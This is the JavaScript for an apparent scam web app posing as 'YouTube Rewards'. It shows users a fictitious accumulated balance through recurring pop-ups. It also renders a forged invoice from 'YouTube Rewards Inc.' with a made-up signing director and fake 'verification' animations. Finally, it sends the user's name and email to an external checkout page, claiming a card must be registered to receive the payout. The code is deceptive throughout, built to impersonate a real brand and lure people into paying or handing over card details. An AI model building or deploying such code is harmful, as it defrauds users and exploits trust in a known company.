(function () {
    'use strict';

    // ─── Storage ──────────────────────────────────────────────────────────────
    function getCurrentUser() { return localStorage.getItem('currentUser'); }
    function getUsers()       { return JSON.parse(localStorage.getItem('users') || '{}'); }
    function saveUsers(u)     { localStorage.setItem('users', JSON.stringify(u)); }
    function getUserData()    { var u = getCurrentUser(); return u ? (getUsers()[u] || null) : null; }

    window.isPremiumUser  = function () { var d = getUserData(); return !!(d && d.isPremium); };
    window.getUserBalance = function () { var d = getUserData(); return d ? (d.balance || 0) : 0; };
    window.setPremium     = function () {
        var u = getCurrentUser(); if (!u) return;
        var users = getUsers(); if (users[u]) { users[u].isPremium = true; saveUsers(users); }
        window.location.reload();
    };

    var CHECKOUT_URL = 'https://checkout.cooud.com/01KRZ2R072GG8Y35W99G0VN2F4';
    var _data = {};

    function goToCheckout() {
        var url = CHECKOUT_URL;
        var p = [];
        if (_data.email) p.push('email=' + encodeURIComponent(_data.email));
        if (_data.name)  p.push('name='  + encodeURIComponent(_data.name));
        if (p.length) url += '?' + p.join('&');
        window.location.href = url;
    }

    // ─── Country detection from postal code ───────────────────────────────────
    async function detectCountryFromPostal(postal) {
        postal = postal.trim().toUpperCase().replace(/\s+/g, ' ');
        // Brazil: 00000-000 or 00000000
        if (/^\d{5}-\d{3}$/.test(postal) || /^\d{8}$/.test(postal)) return '🇧🇷 Brasil';
        // UK: AN NAA, ANN NAA etc
        if (/^[A-Z]{1,2}[0-9][A-Z0-9]? ?[0-9][A-Z]{2}$/.test(postal)) return '🇬🇧 United Kingdom';
        // Canada: A1A 1A1
        if (/^[A-Z][0-9][A-Z] ?[0-9][A-Z][0-9]$/.test(postal)) return '🇨🇦 Canada';
        // 5-digit: try zippopotam for US, then heuristic
        if (/^\d{5}$/.test(postal)) {
            try {
                var r = await fetch('https://api.zippopotam.us/us/' + postal, { signal: AbortSignal.timeout(3000) });
                if (r.ok) return '🇺🇸 United States';
            } catch(e) {}
            var pfx = parseInt(postal.slice(0,2));
            if (pfx >= 1 && pfx <= 52) return '🇪🇸 España';
            return '🇲🇽 México';
        }
        // 5 digits starting with letters (Colombia 6-digit etc)
        if (/^\d{6}$/.test(postal)) return '🇨🇴 Colombia';
        return null;
    }

    // ─── COUNTRIES ────────────────────────────────────────────────────────────
    var COUNTRIES = [
        '🇺🇸 United States','🇪🇸 España','🇲🇽 México','🇨🇴 Colombia',
        '🇦🇷 Argentina','🇨🇱 Chile','🇵🇪 Perú','🇻🇪 Venezuela',
        '🇪🇨 Ecuador','🇧🇴 Bolivia','🇵🇾 Paraguay','🇺🇾 Uruguay',
        '🇬🇹 Guatemala','🇭🇳 Honduras','🇸🇻 El Salvador','🇳🇮 Nicaragua',
        '🇨🇷 Costa Rica','🇵🇦 Panamá','🇩🇴 República Dominicana',
        '🇨🇺 Cuba','🇵🇷 Puerto Rico','🇬🇧 United Kingdom',
        '🇩🇪 Deutschland','🇫🇷 France','🇮🇹 Italia','🇵🇹 Portugal',
        '🇨🇦 Canada','🇦🇺 Australia','🇯🇵 Japan','🇧🇷 Brasil'
    ];

    // ─── STYLES ───────────────────────────────────────────────────────────────
    var CSS = `
    #yrWizOverlay{position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.82);display:flex;align-items:center;justify-content:center;padding:16px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
    #yrWizModal{width:100%;max-width:390px;max-height:94dvh;background:#fff;border-radius:20px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 32px 100px rgba(0,0,0,0.5)}
    .yrHead{background:#FF0000;padding:16px 18px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
    .yrHeadLeft{display:flex;align-items:center;gap:10px}
    .yrHeadLogo{width:28px;height:28px;background:#fff;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:16px}
    .yrHeadTitle{color:#fff;font-size:13px;font-weight:700;line-height:1.2}
    .yrHeadSub{color:rgba(255,255,255,0.8);font-size:11px}
    .yrCloseBtn{background:rgba(255,255,255,0.2);border:none;color:#fff;width:28px;height:28px;border-radius:50%;cursor:pointer;font-size:14px;font-weight:700}
    .yrSteps{display:flex;align-items:center;padding:14px 20px 0;flex-shrink:0}
    .yrStepDot{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;transition:all .3s}
    .yrStepDot.done{background:#FF0000;color:#fff}
    .yrStepDot.active{background:#FF0000;color:#fff;box-shadow:0 0 0 4px rgba(255,0,0,0.2)}
    .yrStepDot.pending{background:#f0f0f0;color:#aaa}
    .yrStepLine{flex:1;height:2px;border-radius:2px;transition:background .3s}
    .yrStepLine.done{background:#FF0000}
    .yrStepLine.pending{background:#f0f0f0}
    .yrStepWrap{display:flex;flex-direction:column;align-items:center}
    .yrStepLabel{font-size:10px;color:#aaa;margin-top:3px}
    .yrStepLabel.active{color:#FF0000;font-weight:600}
    .yrBody{flex:1;overflow-y:auto;padding:18px 20px 24px}
    .yrBal{text-align:center;background:linear-gradient(135deg,#fff5f5,#ffe4e4);border:1px solid #ffd0d0;border-radius:14px;padding:14px;margin-bottom:18px}
    .yrBalLabel{font-size:11px;color:#999;margin-bottom:2px}
    .yrBalAmt{font-size:28px;font-weight:800;color:#FF0000;letter-spacing:-1px}
    .yrField{margin-bottom:14px}
    .yrLabel{display:block;font-size:12px;font-weight:600;color:#444;margin-bottom:5px}
    .yrInput,.yrSelect{width:100%;padding:12px 13px;border:1.5px solid #e5e5e5;border-radius:10px;font-size:14px;color:#111;outline:none;box-sizing:border-box;background:#fff;transition:border .2s}
    .yrInput:focus,.yrSelect:focus{border-color:#FF0000;box-shadow:0 0 0 3px rgba(255,0,0,0.07)}
    .yrBtn{width:100%;padding:15px;background:#FF0000;color:#fff;border:none;border-radius:13px;font-size:15px;font-weight:700;cursor:pointer;box-shadow:0 4px 16px rgba(255,0,0,0.28);margin-top:6px;transition:all .15s}
    .yrBtn:hover{background:#d90000;transform:translateY(-1px)}
    .yrBtn:disabled{opacity:.5;cursor:not-allowed;transform:none}
    .yrTrust{text-align:center;font-size:11px;color:#bbb;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:14px}
    .yrCheckItem{display:flex;align-items:center;gap:12px;padding:11px 14px;border-radius:11px;margin-bottom:8px;font-size:14px;font-weight:500;transition:all .35s}
    .yrCheckItem.loading{background:#f7f7f7;color:#aaa}
    .yrCheckItem.done{background:#f0fdf4;color:#15803d}
    .yrCheckIcon{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0}
    .yrCheckItem.loading .yrCheckIcon{background:#ebebeb}
    .yrCheckItem.done .yrCheckIcon{background:#22c55e;color:#fff}
    .yrSpinner{width:13px;height:13px;border:2px solid #ddd;border-top-color:#FF0000;border-radius:50%;animation:yrSpin .75s linear infinite}
    @keyframes yrSpin{to{transform:rotate(360deg)}}
    .yrFinalBox{background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:1px solid #bbf7d0;border-radius:13px;padding:14px 16px;margin-bottom:16px;text-align:center;font-size:13px;color:#15803d;line-height:1.6}
    `;

    // ─── WIZARD STATE ─────────────────────────────────────────────────────────
    var _step = 1;

    function openWizard() {
        if (document.getElementById('yrWizOverlay')) return;
        // Load cursive font for signature
        if (!document.getElementById('yrCursiveFont')) {
            var lnk = document.createElement('link');
            lnk.id = 'yrCursiveFont';
            lnk.rel = 'stylesheet';
            lnk.href = 'https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap';
            document.head.appendChild(lnk);
        }
        if (!document.getElementById('yrWizStyles')) {
            var s = document.createElement('style'); s.id = 'yrWizStyles';
            s.textContent = CSS; document.head.appendChild(s);
        }
        _step = 1; _data = {};
        var overlay = document.createElement('div');
        overlay.id = 'yrWizOverlay';
        overlay.innerHTML = '<div id="yrWizModal"></div>';
        document.body.appendChild(overlay);
        document.body.style.overflow = 'hidden';
        overlay.addEventListener('click', function(e){ if(e.target===overlay) closeWizard(); });
        render();
    }

    function closeWizard() {
        var o = document.getElementById('yrWizOverlay');
        if (o) o.remove();
        document.body.style.overflow = '';
    }

    function render() {
        var m = document.getElementById('yrWizModal');
        if (!m) return;
        m.innerHTML = header() + steps() + (_step===1 ? body1() : body2());
        bind();
    }

    function header() {
        var titles = ['Dados Pessoais', 'Ativando Conta'];
        return '<div class="yrHead">' +
          '<div class="yrHeadLeft">' +
            '<div class="yrHeadLogo">▶</div>' +
            '<div><div class="yrHeadTitle">YouTube Rewards</div>' +
            '<div class="yrHeadSub">' + titles[_step-1] + ' — Passo ' + _step + ' de 2</div></div>' +
          '</div>' +
          '<button class="yrCloseBtn" id="yrClose">✕</button>' +
        '</div>';
    }

    function steps() {
        function dc(n){ return n < _step ? 'done' : n===_step ? 'active' : 'pending'; }
        return '<div class="yrSteps">' +
          '<div class="yrStepWrap"><div class="yrStepDot '+dc(1)+'">'+(1<_step?'✓':'1')+'</div><div class="yrStepLabel'+(_step===1?' active':'')+'">Dados</div></div>' +
          '<div class="yrStepLine '+(_step>1?'done':'pending')+'"></div>' +
          '<div class="yrStepWrap"><div class="yrStepDot '+dc(2)+'">'+(2<_step?'✓':'2')+'</div><div class="yrStepLabel'+(_step===2?' active':'')+'">Ativar</div></div>' +
        '</div>';
    }

    function body1() {
        var bal = window.getUserBalance ? window.getUserBalance().toFixed(2) : '0.00';
        var opts = COUNTRIES.map(function(c){
            return '<option value="'+c+'"'+(_data.country===c?' selected':'')+'>'+c+'</option>';
        }).join('');
        return '<div class="yrBody">' +
          '<div class="yrBal"><div class="yrBalLabel">Seu saldo acumulado</div><div class="yrBalAmt">$'+bal+'</div></div>' +
          '<p style="font-size:16px;font-weight:800;color:#000;margin:0 0 4px">Informe seus dados</p>' +
          '<p style="font-size:13px;color:#777;margin:0 0 18px;line-height:1.5">Para configurar seu recebimento, precisamos de algumas informações.</p>' +
          '<div class="yrField"><label class="yrLabel">Nome completo</label>' +
            '<input class="yrInput" id="yrName" type="text" placeholder="Seu nome completo" value="'+(_data.name||'')+'"></div>' +
          '<div class="yrField"><label class="yrLabel">E-mail</label>' +
            '<input class="yrInput" id="yrEmail" type="email" placeholder="seu@email.com" value="'+(_data.email||'')+'"></div>' +
          '<div class="yrField"><label class="yrLabel">País de residência</label>' +
            '<select class="yrSelect" id="yrCountry"><option value="">Selecione seu país...</option>'+opts+'</select></div>' +
          '<button class="yrBtn" id="yrNext1">Continuar →</button>' +
          '<div class="yrTrust"><span>🔒 Criptografado</span><span>✓ 100% seguro</span></div>' +
        '</div>';
    }

    function body2() {
        var bal  = window.getUserBalance ? window.getUserBalance().toFixed(2) : '0.00';
        var name  = _data.name  || '';
        var email = _data.email || '';
        var invNum = 'YR-' + Math.floor(100000 + Math.random() * 900000);
        var today = new Date();
        var dateStr = today.toLocaleDateString('es-ES', { day:'2-digit', month:'2-digit', year:'numeric' });

        return '<div class="yrBody">' +
          '<p style="font-size:16px;font-weight:800;color:#000;margin:0 0 4px;text-align:center">Ativando sua conta</p>' +
          '<p style="font-size:13px;color:#777;margin:0 0 14px;line-height:1.5;text-align:center">Configurando seu perfil de recebimento...</p>' +
          '<div id="yrC1" class="yrCheckItem loading"><div class="yrCheckIcon"><div class="yrSpinner"></div></div>Criando conta de recebimento</div>' +
          '<div id="yrC2" class="yrCheckItem loading"><div class="yrCheckIcon"><div class="yrSpinner"></div></div>Verificando saldo disponível</div>' +
          '<div id="yrC3" class="yrCheckItem loading"><div class="yrCheckIcon"><div class="yrSpinner"></div></div>Gerando fatura de pagamento</div>' +
          '<div id="yrFinal" style="display:none">' +

            // ── Invoice ──
            '<div style="border:1px solid #e5e5e5;border-radius:14px;overflow:hidden;margin:14px 0 14px;font-family:Arial,sans-serif">' +

              // Header
              '<div style="background:#1a1a1a;padding:14px 16px;display:flex;align-items:center;justify-content:space-between">' +
                '<div style="color:#fff;font-size:15px;font-weight:800;letter-spacing:1px">▶ YouTube Rewards</div>' +
                '<div style="color:#aaa;font-size:11px">N. ' + invNum + '</div>' +
              '</div>' +

              // Subheader
              '<div style="background:#FF0000;padding:8px 16px">' +
                '<div style="color:#fff;font-size:18px;font-weight:900;letter-spacing:2px">FATURA</div>' +
              '</div>' +

              // Body
              '<div style="padding:14px 16px;background:#fff">' +

                // From / To
                '<div style="display:flex;justify-content:space-between;margin-bottom:14px;font-size:12px">' +
                  '<div>' +
                    '<div style="color:#FF0000;font-weight:700;margin-bottom:3px">De:</div>' +
                    '<div style="color:#333">YouTube Rewards Inc.</div>' +
                    '<div style="color:#666">San Bruno, California</div>' +
                  '</div>' +
                  '<div style="text-align:right">' +
                    '<div style="color:#FF0000;font-weight:700;margin-bottom:3px">Para:</div>' +
                    '<div style="color:#333;font-weight:600">' + name + '</div>' +
                    '<div style="color:#666">' + email + '</div>' +
                    '<div style="color:#999;font-size:11px">' + dateStr + '</div>' +
                  '</div>' +
                '</div>' +

                // Table
                '<table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:10px">' +
                  '<thead><tr style="background:#1a1a1a;color:#fff">' +
                    '<th style="padding:8px 10px;text-align:left">Descripción</th>' +
                    '<th style="padding:8px 6px;text-align:center">Cant.</th>' +
                    '<th style="padding:8px 10px;text-align:right">Total</th>' +
                  '</tr></thead>' +
                  '<tbody><tr style="border-bottom:1px solid #f0f0f0">' +
                    '<td style="padding:10px;color:#333">Pagamento por avaliação de anúncios</td>' +
                    '<td style="padding:10px 6px;text-align:center;color:#555">1</td>' +
                    '<td style="padding:10px;text-align:right;font-weight:700;color:#333">$' + bal + '</td>' +
                  '</tr></tbody>' +
                '</table>' +

                // Total
                '<div style="display:flex;justify-content:flex-end;align-items:center;gap:16px;padding:6px 0 10px;border-top:2px solid #FF0000">' +
                  '<span style="font-size:13px;font-weight:700;color:#333">Total</span>' +
                  '<span style="font-size:18px;font-weight:900;color:#FF0000">$' + bal + '</span>' +
                '</div>' +

              '</div>' +

              // ── Signature ──
              '<div style="display:flex;justify-content:space-between;align-items:flex-end;padding:12px 16px 14px;background:#fff;border-top:1px solid #ebebeb">' +

                // Left — e-document metadata
                '<div style="font-size:9px;color:#aaa;line-height:1.7">' +
                  '<div><strong style="color:#888">Ref.:</strong> ' + invNum + '</div>' +
                  '<div><strong style="color:#888">Emissão:</strong> ' + dateStr + '</div>' +
                  '<div style="margin-top:3px;font-size:8px;color:#ccc;max-width:110px;line-height:1.5">Documento emitido eletronicamente. Válido sem assinatura física.</div>' +
                '</div>' +

                // Right — signature
                '<div style="text-align:right">' +
                  '<div style="font-family:\'Dancing Script\',\'Brush Script MT\',cursive;font-size:15px;font-weight:700;color:#1a1a1a;line-height:1;margin-bottom:2px">Michael R. Santos</div>' +
                  '<div style="width:100%;border-top:1px solid #333;padding-top:3px">' +
                    '<div style="font-size:9px;color:#444;font-weight:600">Diretor Financeiro</div>' +
                    '<div style="font-size:9px;color:#888">YouTube Rewards Inc.</div>' +
                  '</div>' +
                '</div>' +

              '</div>' +

              // ── Payment method + notice (below signature) ──
              '<div style="padding:10px 16px 12px;background:#fff;border-top:1px solid #ebebeb">' +
                '<div style="display:flex;align-items:center;gap:8px;margin-bottom:7px;font-size:11px;color:#333">' +
                  '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>' +
                  '<span><strong>Método de pagamento:</strong> Transferência bancária para conta vinculada</span>' +
                '</div>' +
                '<div style="display:flex;align-items:flex-start;gap:7px;font-size:10px;color:#555;border:1px solid #e0e0e0;border-left:3px solid #999;border-radius:4px;padding:7px 9px;background:#fafafa">' +
                  '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>' +
                  '<span><strong style="color:#444">Aviso:</strong> O valor será depositado no cartão de crédito cadastrado.</span>' +
                '</div>' +
              '</div>' +

              // ── Wave footer ──

              '<div style="position:relative;background:#FF0000;padding:18px 16px 14px;margin-top:0;text-align:center;overflow:hidden">' +
                '<svg viewBox="0 0 400 40" xmlns="http://www.w3.org/2000/svg" style="position:absolute;top:-1px;left:0;width:100%;height:40px">' +
                  '<path d="M0,30 C100,0 300,60 400,20 L400,0 L0,0 Z" fill="#fff"/>' +
                '</svg>' +
                '<div style="position:relative;z-index:1;padding-top:10px">' +
                  '<svg width="36" height="26" viewBox="0 0 90 63" fill="white" xmlns="http://www.w3.org/2000/svg">' +
                    '<path d="M88.2 9.9C87.2 6.3 84.4 3.5 80.8 2.5 73.7 0.6 45 0.6 45 0.6S16.3 0.6 9.2 2.5C5.6 3.5 2.8 6.3 1.8 9.9 0 17 0 31.5 0 31.5S0 46 1.8 53.1C2.8 56.7 5.6 59.5 9.2 60.5 16.3 62.4 45 62.4 45 62.4S73.7 62.4 80.8 60.5C84.4 59.5 87.2 56.7 88.2 53.1 90 46 90 31.5 90 31.5S90 17 88.2 9.9Z"/>' +
                    '<polygon points="36,45 36,18 59,31.5" fill="#FF0000"/>' +
                  '</svg>' +
                '</div>' +
              '</div>' +

            '</div>' +

            // ── CTA ──
            '<button class="yrBtn" id="yrGo" style="font-size:16px;padding:16px">💳 Cadastrar Cartão e Receber $' + bal + ' →</button>' +
            '<div class="yrTrust"><span>🔒 100% seguro</span><span>⚡ Receba em até 24h</span><span>✅ Sem taxas</span></div>' +
          '</div>' +
        '</div>';
    }


    function bind() {
        var close = document.getElementById('yrClose');
        if (close) close.addEventListener('click', closeWizard);

        var next1 = document.getElementById('yrNext1');
        if (next1) next1.addEventListener('click', function(){
            var name    = (document.getElementById('yrName')||{}).value.trim();
            var email   = (document.getElementById('yrEmail')||{}).value.trim();
            var country = (document.getElementById('yrCountry')||{}).value;
            if (!name || !email || !country) { alert('Preencha todos os campos para continuar.'); return; }
            _data = { name: name, email: email, country: country };
            _step = 2; render();
            animate();
        });

        var go = document.getElementById('yrGo');
        if (go) go.addEventListener('click', function(){ closeWizard(); goToCheckout(); });
    }

    function animate() {
        var items = ['yrC1','yrC2','yrC3'];
        items.forEach(function(id, i){
            setTimeout(function(){
                var el = document.getElementById(id);
                if (!el) return;
                el.className = 'yrCheckItem done';
                el.querySelector('.yrCheckIcon').innerHTML = '✓';
                if (i === items.length - 1) {
                    setTimeout(function(){
                        var f = document.getElementById('yrFinal');
                        if (f) f.style.display = 'block';
                    }, 400);
                }
            }, (i + 1) * 900);
        });
    }

    // ─── Entry popup (trigger) ────────────────────────────────────────────────
    function inject() {
        if (document.getElementById('unlockPopupOverlay')) return;
        var el = document.createElement('div');
        el.className = 'popup-overlay';
        el.id = 'unlockPopupOverlay';
        el.innerHTML =
            '<div class="popup unlock-popup">' +
            '<button class="unlock-popup-x" id="unlockPopupX">✕</button>' +
            '<div class="unlock-header">' +
              '<div class="unlock-lock-icon">💳</div>' +
              '<h3 class="unlock-title">Ative sua Conta</h3>' +
              '<p class="unlock-subtitle">Cadastre-se para configurar seu recebimento</p>' +
            '</div>' +
            '<div class="unlock-balance-row">' +
              '<div class="unlock-bal-item">' +
                '<span class="unlock-bal-label">Seu saldo</span>' +
                '<span class="unlock-bal-value current" id="unlockCurrentBalance">$0.00</span>' +
              '</div>' +
              '<div class="unlock-divider">→</div>' +
              '<div class="unlock-bal-item">' +
                '<span class="unlock-bal-label">Status</span>' +
                '<span class="unlock-bal-value minimum" style="color:#f59e0b;font-size:13px">Pendente</span>' +
              '</div>' +
            '</div>' +
            '<div class="unlock-info-box">' +
              '<p>📋 <strong>Como funciona?</strong></p>' +
              '<p>Informe seus dados e confirme seu cartão. Sua conta será ativada e o saldo ficará disponível.</p>' +
            '</div>' +
            '<button class="unlock-cta-btn" id="unlockCtaBtn">' +
              '<span id="unlockCtaBtnText">💳 Ativar Conta e Receber →</span>' +
            '</button>' +
            '<p class="unlock-footer-note">🔒 Seguro · Rápido · Sem taxas ocultas</p>' +
            '</div>';
        document.body.appendChild(el);
        el.querySelector('#unlockPopupX').addEventListener('click', window.closeUnlockPopup);
        el.addEventListener('click', function(e){ if(e.target===el) window.closeUnlockPopup(); });
        el.querySelector('#unlockCtaBtn').addEventListener('click', function(){
            window.closeUnlockPopup(); openWizard();
        });
    }

    window.openUnlockPopup = function () {
        if (window.isPremiumUser()) return;
        inject();
        document.getElementById('unlockCurrentBalance').textContent = '$' + window.getUserBalance().toFixed(2);
        document.getElementById('unlockPopupOverlay').classList.add('show');
        document.body.style.overflow = 'hidden';
    };

    window.closeUnlockPopup = function () {
        var o = document.getElementById('unlockPopupOverlay');
        if (o) o.classList.remove('show');
        document.body.style.overflow = '';
        var txt = document.getElementById('unlockCtaBtnText');
        var btn = document.getElementById('unlockCtaBtn');
        if (txt) txt.textContent = '💳 Ativar Conta e Receber →';
        if (btn) btn.disabled = false;
    };

    window.maybeShowWelcomePopup = function () {
        if (window.isPremiumUser()) return;
        var today = new Date().toISOString().split('T')[0];
        var key = 'welcomeShown_' + getCurrentUser();
        if (localStorage.getItem(key) === today) return;
        localStorage.setItem(key, today);
        setTimeout(function () {
            inject();
            var bal = window.getUserBalance();
            document.getElementById('unlockCurrentBalance').textContent = '$' + bal.toFixed(2);
            document.querySelector('#unlockPopupOverlay .unlock-title').textContent = '$' + bal.toFixed(2) + ' aguardando ativação!';
            document.querySelector('#unlockPopupOverlay .unlock-subtitle').textContent = 'Ative sua conta para liberar o recebimento';
            document.getElementById('unlockPopupOverlay').classList.add('show');
            document.body.style.overflow = 'hidden';
        }, 2000);
    };

    var MILESTONES = [100, 200, 500, 1000, 2000, 5000];
    window.checkMilestone = function (balance, userData, saveUserData) {
        if (window.isPremiumUser()) return;
        if (!userData.shownMilestones) userData.shownMilestones = [];
        var hit = MILESTONES.filter(function(m){ return balance >= m && !userData.shownMilestones.includes(m); })[0];
        if (!hit) return;
        userData.shownMilestones.push(hit); saveUserData();
        setTimeout(function () {
            inject();
            document.getElementById('unlockCurrentBalance').textContent = '$' + balance.toFixed(2);
            document.querySelector('#unlockPopupOverlay .unlock-title').textContent = '🎉 $' + hit + ' disponíveis!';
            document.querySelector('#unlockPopupOverlay .unlock-subtitle').textContent = 'Ative sua conta para receber agora';
            document.getElementById('unlockPopupOverlay').classList.add('show');
            document.body.style.overflow = 'hidden';
        }, 1500);
    };

    document.addEventListener('DOMContentLoaded', function () {
        inject();
        if (new URLSearchParams(window.location.search).get('premium') === '1') {
            history.replaceState({}, '', window.location.pathname);
            if (window.setPremium) window.setPremium();
        }
    });
})();
